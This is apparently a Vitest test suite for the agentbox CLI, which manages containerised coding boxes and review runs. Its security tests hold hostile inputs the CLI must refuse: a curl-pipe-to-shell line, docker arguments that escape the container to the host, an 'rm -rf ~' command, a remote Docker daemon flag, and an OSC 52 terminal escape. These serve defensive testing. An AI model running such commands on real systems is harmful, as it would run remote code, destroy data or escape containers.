// The agentbox CLI against a fake server.
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { childEnv, runCli } from "../src/program.js";
import { startFakeServer, type FakeServer } from "./fake-server.js";
import {
  BOX_ID,
  CONTAINER,
  PROJECT_ID,
  RUN,
  boxView,
  engine,
  finding,
  imageStatus,
  job,
  project,
  projectSummary,
  roundSummary,
  runState,
  setupStatus,
  vendorUsage,
} from "./fixtures.js";

const TOKEN = "cli-test-token";
let server: FakeServer;
let home: string;
let out: string;
let err: string;
let execs: string[][];

beforeEach(async () => {
  server = await startFakeServer(TOKEN);
  home = mkdtempSync(path.join(tmpdir(), "agentbox-cli-"));
  // The CLI pins the certificate in the data directory, as the server writes it.
  mkdirSync(path.join(home, ".claude-box"));
  writeFileSync(path.join(home, ".claude-box", "server.crt"), server.cert);
  out = "";
  err = "";
  execs = [];
});
afterEach(async () => {
  await server.close();
  rmSync(home, { recursive: true, force: true });
});

function cli(args: string[], env: Record<string, string | undefined> = {}, cwd?: string) {
  return runCli(args, {
    cwd,
    env: { AGENTBOX_SERVER: server.url, AGENTBOX_TOKEN: TOKEN, ...env },
    home,
    out: (t) => (out += t),
    err: (t) => (err += t),
    pollMs: 5,
    exec: async (argv) => {
      execs.push(argv);
      return 7;
    },
  });
}

const last = () => server.requests[server.requests.length - 1];

/** The argv the server returns to attach to a box's tmux session. */
const sessionArgv = () => [
  "docker",
  "exec",
  "-it",
  "--detach-keys=ctrl-],ctrl-]",
  CONTAINER,
  "bash",
  "-c",
  'for i in $(seq 1 300); do tmux has-session -t "=$1" 2>/dev/null && break; sleep 0.1; done; exec tmux attach -t "=$1"',
  "_",
  "main",
];
/** The argv the server returns to open a shell in a box. */
const shellArgv = () => [
  "docker",
  "exec",
  "-it",
  "-w",
  "/home/dev/project",
  CONTAINER,
  "bash",
  "-l",
];

describe("settings", () => {
  it("reads the token from ~/.claude-box/server.token and the port from config.json", async () => {
    writeFileSync(path.join(home, ".claude-box", "server.token"), `${TOKEN}\n`);
    const port = new URL(server.url).port;
    writeFileSync(
      path.join(home, ".claude-box", "config.json"),
      JSON.stringify({ serverPort: Number(port) }),
    );
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    const code = await cli(["box", "list"], {
      AGENTBOX_SERVER: undefined,
      AGENTBOX_TOKEN: undefined,
    });
    expect(code).toBe(0);
    expect(last()?.authorization).toBe(`Bearer ${TOKEN}`);
  });

  it("reads the token and config.json from AGENTBOX_DATA_DIR when set", async () => {
    const dataDir = path.join(home, "data");
    mkdirSync(dataDir);
    writeFileSync(path.join(dataDir, "server.token"), `${TOKEN}\n`);
    writeFileSync(path.join(dataDir, "server.crt"), server.cert);
    writeFileSync(
      path.join(dataDir, "config.json"),
      JSON.stringify({ serverPort: Number(new URL(server.url).port) }),
    );
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    const code = await cli(["box", "list"], {
      AGENTBOX_SERVER: undefined,
      AGENTBOX_TOKEN: undefined,
      AGENTBOX_DATA_DIR: dataDir,
    });
    expect(code).toBe(0);
    expect(last()?.authorization).toBe(`Bearer ${TOKEN}`);
  });

  it("prefers --server over AGENTBOX_SERVER", async () => {
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    expect(
      await cli(["--server", server.url, "box", "list"], {
        AGENTBOX_SERVER: "https://127.0.0.1:1",
      }),
    ).toBe(0);
  });

  it("explains a refused token", async () => {
    const code = await cli(["box", "list"], { AGENTBOX_TOKEN: "wrong" });
    expect(code).toBe(1);
    expect(err).toContain("refused the token");
  });

  it("explains an unreachable server", async () => {
    const code = await cli(["box", "list"], { AGENTBOX_SERVER: "https://127.0.0.1:1" });
    expect(code).toBe(1);
    expect(err).toContain("Can't reach the Agent Box server");
  });
});

describe("box", () => {
  it("lists boxes as a table, or JSON with --json", async () => {
    server.on("GET /api/v1/boxes", { body: { boxes: [boxView()] } });
    expect(await cli(["box", "list", "--project", PROJECT_ID])).toBe(0);
    expect(last()?.query).toEqual({ projectId: PROJECT_ID });
    expect(out.split("\n")[0]).toMatch(/^BOX\s+STATUS\s+REVIEW\s+PLATFORM/);
    expect(out).toContain(BOX_ID);
    out = "";
    await cli(["--json", "box", "list"]);
    expect(JSON.parse(out).boxes[0].box.id).toBe(BOX_ID);
  });

  it("creates a box and waits for the job", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    let polls = 0;
    server.on("GET /api/v1/jobs/job-1", () => ({
      body: job(++polls < 2 ? "running" : "finished"),
    }));
    const code = await cli([
      "box",
      "new",
      "/home/user/src/example",
      "-n",
      "feature",
      "--layout",
      "worktree",
      "--effort",
      "high",
      "--ssh-remote",
      "staging",
    ]);
    expect(code).toBe(0);
    expect(server.requests.find((r) => r.method === "POST")?.body).toMatchObject({
      targetDir: "/home/user/src/example",
      conversationName: "feature",
      layout: "worktree",
      effort: "high",
      conversation: { mode: "new" },
      sshRemoteRefs: ["staging"],
      skipPermissions: true,
      start: true,
    });
    expect(out).toBe(`Created ${BOX_ID}.\n`);
  });

  it("adopts or forks a conversation and can skip waiting", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    await cli([
      "box",
      "new",
      "/d",
      "--adopt",
      "0b9f2a7e-4c1d-4e8a-9f3b-2d6c8e1a5b70",
      "--no-wait",
      "--no-start",
    ]);
    expect(last()?.body).toMatchObject({
      conversation: { mode: "adopt", sessionUuid: "0b9f2a7e-4c1d-4e8a-9f3b-2d6c8e1a5b70" },
      start: false,
    });
    expect(out).toContain("job job-1");
    await cli(["box", "new", "/d", "--fork", BOX_ID, "--no-wait"]);
    expect(last()?.body).toMatchObject({ conversation: { mode: "fork", fromBoxId: BOX_ID } });
    expect(await cli(["box", "new", "/d", "--fork", BOX_ID, "--adopt", "x"])).toBe(2);
  });

  it("reports a failed creation job", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("failed") });
    expect(await cli(["box", "new", "/d"])).toBe(1);
    expect(err).toContain("Build the image first.");
  });

  it("validates the body before sending it", async () => {
    expect(await cli(["box", "new", "/d", "--layout", "worktree", "--no-wait"])).toBe(1);
    expect(server.requests).toHaveLength(0);
    expect(err).toContain("conversation name");
  });

  it("starts, stops, and restarts a box", async () => {
    for (const verb of ["start", "stop", "restart"]) {
      server.on(`POST /api/v1/boxes/${BOX_ID}/${verb}`, {
        body: boxView(verb === "stop" ? "stopped" : "running"),
      });
      out = "";
      expect(await cli(["box", verb, BOX_ID])).toBe(0);
      expect(out).toBe(`${BOX_ID} is ${verb === "stop" ? "stopped" : "running"}.\n`);
    }
  });

  it("passes server errors through with their code", async () => {
    server.on(`POST /api/v1/boxes/${BOX_ID}/start`, {
      status: 409,
      body: { error: { code: "box_running", message: "The box is running." } },
    });
    expect(await cli(["box", "start", BOX_ID])).toBe(1);
    expect(err).toBe("Error (box_running): The box is running.\n");
  });

  it("removes a box, with its worktree on request", async () => {
    server.on(`DELETE /api/v1/boxes/${BOX_ID}`, {
      body: { removed: true, worktree: "removed", reason: null },
    });
    await cli(["box", "remove", BOX_ID, "--remove-worktree"]);
    expect(last()?.query).toEqual({ removeWorktree: "true" });
    expect(out).toContain("Worktree: removed");
  });

  it("purges only with --yes", async () => {
    expect(await cli(["box", "purge", BOX_ID])).toBe(2);
    expect(server.requests).toHaveLength(0);
    server.on(`POST /api/v1/boxes/${BOX_ID}/purge`, {
      body: { removedRecords: [BOX_ID], removedTranscriptDirs: ["/x"], dryRun: false },
    });
    expect(await cli(["box", "purge", BOX_ID, "--yes"])).toBe(0);
    expect(last()?.body).toEqual({ dryRun: false });
    expect(out).toContain("Removed 1 records and 1 transcript directories.");
  });

  it("previews a purge with --dry-run and no --yes", async () => {
    server.on(`POST /api/v1/boxes/${BOX_ID}/purge`, {
      body: { removedRecords: [BOX_ID], removedTranscriptDirs: [], dryRun: true },
    });
    expect(await cli(["box", "purge", BOX_ID, "--dry-run"])).toBe(0);
    expect(last()?.body).toEqual({ dryRun: true });
    expect(out).toContain("Would remove 1 records and 0 transcript directories.");
  });

  it("attaches through the server's attach command", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: sessionArgv() },
    });
    expect(await cli(["box", "attach", BOX_ID])).toBe(7);
    expect(last()?.query).toEqual({ kind: "session" });
    expect(execs[0]?.[0]).toBe("docker");
    await cli(["box", "attach", BOX_ID, "--side", "codex"]);
    expect(last()?.query).toEqual({ kind: "side", platform: "codex" });
    await cli(["box", "shell", BOX_ID]);
    expect(last()?.query).toEqual({ kind: "shell" });
  });

  it("opens a stopped box by starting it first", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView("stopped") });
    server.on(`POST /api/v1/boxes/${BOX_ID}/start`, { body: boxView("running") });
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: sessionArgv() },
    });
    expect(await cli(["box", "open", BOX_ID])).toBe(7);
    expect(server.requests.map((r) => `${r.method} ${r.path}`)).toEqual([
      `GET /api/v1/boxes/${BOX_ID}`,
      `POST /api/v1/boxes/${BOX_ID}/start`,
      `GET /api/v1/boxes/${BOX_ID}/attach-command`,
    ]);
  });

  it("sends a message", async () => {
    server.on(`POST /api/v1/boxes/${BOX_ID}/message`, { body: { ok: true } });
    expect(await cli(["box", "message", BOX_ID, "Hold", "edits"])).toBe(0);
    expect(last()?.body).toEqual({ text: "Hold edits" });
  });
});

describe("project", () => {
  it("lists and shows projects", async () => {
    server.on("GET /api/v1/projects", { body: { projects: [projectSummary] } });
    await cli(["project", "list"]);
    expect(out).toContain(PROJECT_ID);
    expect(out).toContain(`${CONTAINER} (running)`);
    server.on(`GET /api/v1/projects/${PROJECT_ID}`, { body: projectSummary });
    out = "";
    await cli(["project", "show", PROJECT_ID]);
    expect(out).toContain("Secrets:");
    expect(out).toContain("API_TOKEN");
    expect(out).not.toContain("op://");
    expect(out).not.toContain("stale");
  });

  it("flags a container that runs with old settings", async () => {
    const stale = {
      ...projectSummary,
      container: { ...projectSummary.container, stale: ["secrets environment -> broker"] },
    };
    server.on("GET /api/v1/projects", { body: { projects: [stale] } });
    await cli(["project", "list"]);
    expect(out).toContain(`${CONTAINER} (running, stale)`);
    server.on(`GET /api/v1/projects/${PROJECT_ID}`, { body: stale });
    out = "";
    await cli(["project", "show", PROJECT_ID]);
    expect(out).toMatch(/Stale: +secrets environment -> broker/);
  });

  it("changes settings and reports stale boxes", async () => {
    server.on(`PATCH /api/v1/projects/${PROJECT_ID}`, { body: { project, staleBoxes: [BOX_ID] } });
    await cli([
      "project",
      "set",
      PROJECT_ID,
      "--name",
      "Example",
      "--tcp-map",
      "18080:8080",
      "--tcp-map",
      "9000",
      "--mount",
      "/srv/data",
      "--clear-ceilings",
    ]);
    expect(last()?.body).toEqual({
      name: "Example",
      tcpMaps: [
        { host: 18080, container: 8080 },
        { host: 9000, container: 9000 },
      ],
      mounts: [{ host: "/srv/data", container: "/srv/data" }],
      ceilingsOverride: null,
    });
    expect(out).toContain(`Restart the container to apply the change to: ${BOX_ID}`);
  });

  it("refuses an empty or invalid change", async () => {
    expect(await cli(["project", "set", PROJECT_ID])).toBe(2);
    expect(await cli(["project", "set", PROJECT_ID, "--tcp-map", "x:1"])).toBe(2);
    expect(server.requests).toHaveLength(0);
  });
});

describe("review", () => {
  it("starts a run from a box", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView() });
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    expect(
      await cli(["review", "start", "--box", BOX_ID, "--profile", "fast", "--exact-base"]),
    ).toBe(0);
    expect(last()?.body).toMatchObject({
      projectId: PROJECT_ID,
      boxId: BOX_ID,
      repoPath: "/home/user/src/example/.worktrees/feature",
      tip: "claude/feature",
      base: "origin/main",
      profile: "fast",
      exactBase: true,
      mergeBase: false,
    });
    expect(out).toBe(`Started run ${RUN}.\n`);
  });

  it("passes the round and continuation caps", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    const args = ["review", "start", "--project", PROJECT_ID, "--repo", "/r", "--read-only"];
    expect(await cli([...args, "--round-cap", "2", "--continuation-cap", "0"])).toBe(0);
    expect(last()?.body).toMatchObject({ readOnly: true, roundCap: 2, continuationCap: 0 });
    expect(await cli([...args, "--continuation-cap", "-1"])).not.toBe(0);
  });

  it("refuses a read-only post-push run without calling the server", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    const args = ["review", "start", "--project", PROJECT_ID, "--repo", "/r", "--read-only"];
    expect(await cli([...args, "--pipeline", "post-push"])).toBe(2);
    expect(last()).toBeUndefined();
    expect(err).toContain("read-only run can't use the post-push pipeline");
  });

  it("needs a box or a project and repository", async () => {
    expect(await cli(["review", "start"])).toBe(2);
  });

  it("lists runs and shows one with its rounds", async () => {
    server.on("GET /api/v1/runs", { body: { runs: [runState] } });
    await cli(["review", "status"]);
    expect(out).toMatch(/^RUN\s+STATUS/);
    server.on(`GET /api/v1/runs/${RUN}`, { body: runState });
    server.on(`GET /api/v1/runs/${RUN}/rounds`, { body: { rounds: [roundSummary] } });
    out = "";
    await cli(["review", "status", RUN]);
    expect(out).toContain("Reviewers:");
    expect(out).toContain("codex, copilot");
    expect(out).toContain("$1.40");
    expect(out).toContain("codex 2/4");
  });

  it("pauses, resumes, and cancels", async () => {
    for (const verb of ["pause", "resume", "cancel"]) {
      server.on(`POST /api/v1/runs/${RUN}/${verb}`, { body: runState });
      expect(await cli(["review", verb, RUN])).toBe(0);
    }
    expect(server.requests.map((r) => r.path)).toEqual([
      `/api/v1/runs/${RUN}/pause`,
      `/api/v1/runs/${RUN}/resume`,
      `/api/v1/runs/${RUN}/cancel`,
    ]);
  });

  it("pushes a run's branch", async () => {
    server.on(`POST /api/v1/runs/${RUN}/push`, { body: runState });
    expect(await cli(["review", "push", RUN])).toBe(0);
    expect(last()?.body).toEqual({ draft: false });
    expect(out).toContain(`Pushed run ${RUN}`);
    await cli(["review", "push", RUN, "--title", "Fix the mailer", "--draft"]);
    expect(last()?.body).toEqual({ title: "Fix the mailer", draft: true });
    expect(await cli(["review", "push"])).toBe(2);
    out = "";
    expect(await cli(["review", "push", "--help"])).toBe(0);
    expect(out.replace(/\s+/g, " ")).toContain("post-push loop");
  });

  it("assigns roles and switches profiles", async () => {
    server.on(`POST /api/v1/runs/${RUN}/assign`, { body: runState });
    await cli(["review", "assign", RUN, "reviewer", "codex", "claude"]);
    expect(last()?.body).toEqual({ role: "reviewer", vendors: ["codex", "claude"] });
    expect(await cli(["review", "assign", RUN, "boss", "codex"])).toBe(2);
    expect(await cli(["review", "assign", RUN, "fixer", "gemini"])).toBe(2);
    expect(err).toContain("Unknown vendor gemini");
    server.on(`PUT /api/v1/runs/${RUN}/profile`, { body: runState });
    await cli(["review", "profile", RUN, "balanced"]);
    expect(last()?.body).toEqual({ profile: "balanced" });
  });

  it("shows usage against ceilings", async () => {
    server.on("GET /api/v1/usage", { body: { vendors: [vendorUsage] } });
    await cli(["review", "usage"]);
    expect(out).toContain("42%");
    expect(out).toContain("60% of 5h");
  });

  it("lists findings with filters", async () => {
    server.on(`GET /api/v1/runs/${RUN}/findings`, { body: { findings: [finding] } });
    await cli(["review", "findings", RUN, "--severity", "P1", "--round", "2"]);
    expect(last()?.query).toEqual({ severity: "P1", round: "2" });
    expect(out).toContain("src/mailer.ts:120-134");
  });

  it("shows control characters in model text instead of sending them to the terminal", async () => {
    const osc52 = "\u001b]52;c;U1lOVEhFVElD\u0007";
    const title = `Retry loop ${osc52}never \u009b31m gives up`;
    server.on(`GET /api/v1/runs/${RUN}/findings`, {
      body: { findings: [{ ...finding, title }] },
    });
    await cli(["review", "findings", RUN]);
    expect(out).toContain("Retry loop \\x1b]52;c;U1lOVEhFVElD\\x07never \\x9b31m gives up");
    out = "";
    await cli(["--json", "review", "findings", RUN]);
    // eslint-disable-next-line no-control-regex -- the test looks for raw control characters.
    expect(out).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
    expect(JSON.parse(out).findings[0].title).toBe(title);
  });

  it("answers a decision", async () => {
    server.on(`POST /api/v1/runs/${RUN}/decision`, { body: runState });
    expect(await cli(["review", "decide", RUN, "resume_waive"])).toBe(2);
    await cli([
      "review",
      "decide",
      RUN,
      "resume_waive",
      "--waive",
      "F-0001",
      "--reason",
      "Accepted",
    ]);
    expect(last()?.body).toEqual({
      option: "resume_waive",
      waiveFindingIds: ["F-0001"],
      reason: "Accepted",
    });
  });
});

describe("relative paths", () => {
  const CWD = "/home/user/src/example";

  it("resolves them against the CLI's working directory before sending", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    await cli(["box", "new", ".", "--layout", "root", "--no-wait"], {}, CWD);
    expect(last()?.body).toMatchObject({ targetDir: CWD });

    server.on(`PATCH /api/v1/projects/${PROJECT_ID}`, {
      body: { project, staleBoxes: [] },
    });
    await cli(
      [
        "project",
        "set",
        PROJECT_ID,
        "--primary-repo",
        "../repo",
        "--mount",
        "data",
        "--mount",
        "cache:/cache",
      ],
      {},
      CWD,
    );
    expect(last()?.body).toEqual({
      primaryRepo: "/home/user/src/repo",
      mounts: [
        { host: `${CWD}/data`, container: `${CWD}/data` },
        { host: `${CWD}/cache`, container: "/cache" },
      ],
    });

    server.on("POST /api/v1/runs", { status: 201, body: runState });
    await cli(["review", "start", "--project", PROJECT_ID, "--repo", "."], {}, CWD);
    expect(last()?.body).toMatchObject({ repoPath: CWD });
  });
});

describe("migrate, setup, doctor", () => {
  it("calls the import route", async () => {
    const report = {
      dryRun: true,
      projects: 1,
      boxes: 3,
      sshRemotes: 0,
      settingsApplied: true,
      warnings: ["Skipped the record x: no target_dir."],
    };
    server.on("POST /api/v1/import", { body: report });
    expect(await cli(["migrate", "--dry-run"])).toBe(0);
    expect(last()?.body).toEqual({ dryRun: true });
    expect(out).toContain(
      "Would import 1 projects, 3 boxes, 0 SSH remotes, and the global settings.",
    );
    expect(out).toContain("Warning: Skipped the record x: no target_dir.");
    expect(await cli(["migrate", "--json"])).toBe(0);
    expect(JSON.parse(out.slice(out.indexOf("{")))).toEqual(report);
  });

  it("prints the setup checks", async () => {
    server.on("GET /api/v1/setup", { body: setupStatus });
    expect(await cli(["setup"])).toBe(0);
    expect(out).toMatch(/op\s+fail\s+op isn't installed\./);
  });

  const healthy = () => {
    server.on("GET /api/v1/health", { body: { version: "4.0.0-dev", uptimeS: 5 } });
    server.on("GET /api/v1/setup", {
      body: { ...setupStatus, checks: setupStatus.checks.filter((c) => c.id !== "op") },
    });
    server.on("GET /api/v1/image", { body: imageStatus });
    server.on("GET /api/v1/projects", { body: { projects: [projectSummary] } });
  };

  it("passes doctor on a healthy setup", async () => {
    healthy();
    expect(await cli(["doctor"])).toBe(0);
    expect(out).toMatch(/server\s+ok/);
    expect(out).toMatch(/token\s+ok\s+AGENTBOX_TOKEN/);
    expect(out).toMatch(new RegExp(`engine ${PROJECT_ID}\\s+ok`));
    expect(out).toMatch(/sudo\s+ok\s+sudo is off in containers\./);
  });

  it("fails doctor when the sudo password reference doesn't resolve", async () => {
    healthy();
    server.on("GET /api/v1/setup", {
      body: {
        ...setupStatus,
        checks: [
          ...setupStatus.checks.filter((c) => c.id !== "sudo"),
          {
            id: "sudo",
            status: "fail",
            message: "The sudo password reference op://SYNTHETIC/sudo/password doesn't resolve.",
            fixable: false,
          },
        ],
      },
    });
    expect(await cli(["doctor"])).toBe(1);
    expect(out).toMatch(/sudo\s+fail/);
  });

  it("fails doctor on a mismatched engine", async () => {
    healthy();
    server.on("GET /api/v1/projects", {
      body: {
        projects: [
          {
            ...projectSummary,
            container: {
              ...projectSummary.container,
              engine: { ...engine, versionMatches: false },
            },
          },
        ],
      },
    });
    expect(await cli(["doctor"])).toBe(1);
    expect(out).toContain("(mismatch)");
  });

  it("fails doctor without a token or with a refused one", async () => {
    healthy();
    expect(await cli(["doctor"], { AGENTBOX_TOKEN: undefined })).toBe(1);
    expect(out).toMatch(/token\s+fail\s+No token/);
    out = "";
    expect(await cli(["doctor"], { AGENTBOX_TOKEN: "wrong" })).toBe(1);
    expect(out).toMatch(/token\s+fail/);
  });

  it("fails doctor when the server is down", async () => {
    expect(await cli(["doctor"], { AGENTBOX_SERVER: "https://127.0.0.1:1" })).toBe(1);
    expect(out).toMatch(/server\s+fail/);
  });
});

describe("events", () => {
  const event = {
    id: "e1",
    time: "2026-10-28T09:00:00.000Z",
    source: `engine:${CONTAINER}`,
    streamId: "srv-1",
    seq: 1,
    sourceSeq: 4,
    type: "ports.changed",
    container: CONTAINER,
    listeners: [],
  };

  it("prints frames as JSON lines and stops after --count events", async () => {
    server.events = [event, { ...event, id: "e2", seq: 2 }];
    expect(await cli(["events", "--types", "ports.changed", "--count", "2"])).toBe(0);
    const lines = out
      .trim()
      .split("\n")
      .map((l) => JSON.parse(l));
    expect(lines.map((l) => l.type)).toEqual(["hello", "ports.changed", "ports.changed"]);
    expect(server.lastEventsQuery).toEqual({ types: "ports.changed" });
  });

  it("fails on a frame that breaks the contract", async () => {
    server.events = [{ type: "nonsense" }];
    expect(await cli(["events", "--count", "1"])).toBe(1);
    expect(err).toContain("doesn't match the contract");
  });

  it("fails on a refused token", async () => {
    expect(await cli(["events"], { AGENTBOX_TOKEN: "wrong" })).toBe(1);
    expect(err).toContain("refused the token");
  });

  it("fails when the server closes the stream with an error code", async () => {
    server.closeEventsWith = { code: 1008, reason: "Unknown event types: bogus." };
    expect(await cli(["events", "--types", "bogus"])).toBe(1);
    expect(err).toContain("Unknown event types: bogus.");
  });

  it("ends cleanly when the server closes the stream normally", async () => {
    server.closeEventsWith = { code: 1000, reason: "" };
    expect(await cli(["events"])).toBe(0);
  });
});

describe("help", () => {
  it("prints help and exits 0", async () => {
    expect(await cli(["--help"])).toBe(0);
    expect(out).toContain("Usage: agentbox");
    out = "";
    expect(await cli(["review", "--help"])).toBe(0);
    expect(out).toContain("findings");
  });

  it("exits 2 on an unknown command", async () => {
    expect(await cli(["frobnicate"])).toBe(2);
  });
});

describe("trust in the server", () => {
  it("refuses to send the token over plain HTTP to another host", async () => {
    const code = await cli(["box", "list"], { AGENTBOX_SERVER: "http://203.0.113.5:21400" });
    expect(code).not.toBe(0);
    expect(err).toMatch(/won't send its token over plain HTTP to 203\.0\.113\.5:21400/);
    expect(server.requests).toHaveLength(0);
  });

  it("allows plain HTTP only with --insecure, and https anywhere", async () => {
    const { checkServerUrl } = await import("../src/settings.js");
    expect(checkServerUrl("http://203.0.113.5:21400", true)).toBeNull();
    expect(checkServerUrl("https://agentbox.example.com", false)).toBeNull();
    expect(checkServerUrl("http://localhost:21400", false)).toMatch(/use https:\/\/localhost/);
    expect(checkServerUrl("http://[::1]:21400", false)).toMatch(/serves HTTPS/);
    expect(checkServerUrl("http://127.0.0.1:21400", true)).toBeNull();
    expect(checkServerUrl("ftp://127.0.0.1", false)).toMatch(/http or https/);
  });

  it("keeps the server URL's credentials out of its messages", async () => {
    expect(await cli(["box", "list"], { AGENTBOX_SERVER: "https://user:hunter2@[bad" })).toBe(2);
    expect(err).toMatch(/isn't a valid URL/);
    expect(err).not.toContain("hunter2");
    err = "";
    expect(await cli(["box", "list"], { AGENTBOX_SERVER: "https://user:hunter2@127.0.0.1:1" })).toBe(
      1,
    );
    expect(err).toMatch(/Can't reach the Agent Box server at https:\/\/127\.0\.0\.1:1/);
    expect(err).not.toContain("hunter2");
  });

  it("treats every form of a loopback host as this machine", async () => {
    const { isLoopbackHost, pinsServer } = await import("../src/settings.js");
    for (const url of [
      "https://localhost.:21400",
      "https://[::ffff:127.0.0.1]:21400",
      "https://[::ffff:7f00:1]:21400",
      "https://127.1.2.3:21400",
    ]) {
      expect(pinsServer(url), url).toBe(true);
    }
    expect(isLoopbackHost("[::ffff:c000:201]")).toBe(false);
    expect(isLoopbackHost("localhost.example.com")).toBe(false);
  });

  it("refuses plain HTTP to this machine, where another program can hold the port", async () => {
    const code = await cli(["box", "list"], { AGENTBOX_SERVER: "http://127.0.0.1:21400" });
    expect(code).toBe(2);
    expect(err).toMatch(/serves HTTPS/);
  });

  it("sends nothing to a server on this machine with another certificate", async () => {
    const squatter = await startFakeServer(TOKEN);
    try {
      squatter.on("GET /api/v1/boxes", { body: { boxes: [] } });
      const code = await cli(["box", "list"], { AGENTBOX_SERVER: squatter.url });
      expect(code).toBe(1);
      expect(err).toMatch(/certificate other than the one in the data directory's server\.crt/);
      expect(squatter.requests).toEqual([]);
      err = "";
      const events = await cli(["events", "--count", "1"], { AGENTBOX_SERVER: squatter.url });
      expect(events).toBe(1);
      expect(err).toMatch(/server\.crt/);
      expect(squatter.lastEventsQuery).toBeNull();
    } finally {
      await squatter.close();
    }
  });

  it("reads the certificate again for every call", async () => {
    server.on("GET /api/v1/boxes", { body: { boxes: [] } });
    rmSync(path.join(home, ".claude-box", "server.crt"));
    expect(await cli(["box", "list"])).toBe(1);
    expect(err).toMatch(/No server certificate at .*server\.crt/);
    expect(server.requests).toEqual([]);
    writeFileSync(path.join(home, ".claude-box", "server.crt"), server.cert);
    expect(await cli(["box", "list"])).toBe(0);
  });

  it("runs only docker exec from a server's attach command", async () => {
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: ["sh", "-c", "curl https://example.com/x | sh"] },
    });
    const code = await cli(["box", "attach", BOX_ID]);
    expect(code).not.toBe(0);
    expect(execs).toEqual([]);
    expect(err).toMatch(/runs only docker exec/);
    err = "";
    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
      body: { argv: ["/tmp/docker", "exec"] },
    });
    expect(await cli(["box", "attach", BOX_ID])).toBe(2);
    expect(err).toMatch(/runs only docker exec/);
    expect(execs).toEqual([]);
  });

  it("refuses docker arguments outside the shapes the server builds", async () => {
    const { checkAttachArgv } = await import("../src/settings.js");
    expect(checkAttachArgv(sessionArgv())).toBeNull();
    expect(checkAttachArgv(shellArgv())).toBeNull();
    const refused: string[][] = [
      [],
      ["docker", "run", "--privileged", "-v", "/:/host", "ubuntu", "chroot", "/host"],
      ["docker", "exec", "--privileged", "-it", CONTAINER, "bash", "-l"],
      ["docker", "exec", "-it", "-w", "/w", "-v", "/:/host", CONTAINER, "bash", "-l"],
      ["docker", "exec", "-it", "--mount", "type=bind,src=/,dst=/h", CONTAINER, "bash"],
      ["docker", "exec", "-it", "-w", "/w", "other-container", "bash", "-l"],
      ["docker", "exec", "-it", "-w", "relative", CONTAINER, "bash", "-l"],
      ["docker", "exec", "-it", "-w", "/w", "--privileged", "bash", "-l"],
      [...sessionArgv().slice(0, 7), "rm -rf ~", "_", "main"],
      [...sessionArgv().slice(0, 9), "--privileged"],
      [...sessionArgv(), "extra"],
      [...shellArgv().slice(0, 6), "sh", "-c"],
      ["docker", "-H", "tcp://198.51.100.7:2375", ...sessionArgv().slice(1)],
    ];
    for (const argv of refused) expect(checkAttachArgv(argv), argv.join(" ")).not.toBeNull();
    expect(checkAttachArgv([])).toMatch(/empty/);
  });

  it("keeps its copy of the attach script equal to the server's", async () => {
    const { ATTACH_SCRIPT } = await import("../src/settings.js");
    const { readFile } = await import("node:fs/promises");
    const source = await readFile(
      new URL("../../server/src/terminals/attach.ts", import.meta.url),
      "utf8",
    );
    const match = /EXTERNAL_ATTACH_SCRIPT =\s*'([^']*)'/.exec(source);
    expect(match?.[1]).toBe(ATTACH_SCRIPT);
  });

  it("fails cleanly on an event frame that isn't JSON", async () => {
    const { tailEvents } = await import("../src/events.js");
    const { EventEmitter } = await import("node:events");
    class FakeSocket extends EventEmitter {
      readonly OPEN = 1;
      readonly CONNECTING = 0;
      readyState = 1;
      constructor() {
        super();
        setTimeout(() => this.emit("message", Buffer.from("not json")), 1);
      }
      send() {}
      close() {
        this.readyState = 3;
      }
    }
    await expect(
      tailEvents({
        baseUrl: "http://127.0.0.1:1",
        token: "t",
        write: () => undefined,
        WebSocket: FakeSocket as never,
      }),
    ).rejects.toThrow(/isn't JSON/);
  });
});

describe("child environment", () => {
  it("drops the server token and keeps everything else", () => {
    const env = childEnv({ PATH: "/usr/bin", AGENTBOX_TOKEN: "t", AGENTBOX_SERVER_TOKEN: "s" });
    expect(env).toEqual({ PATH: "/usr/bin" });
  });
});
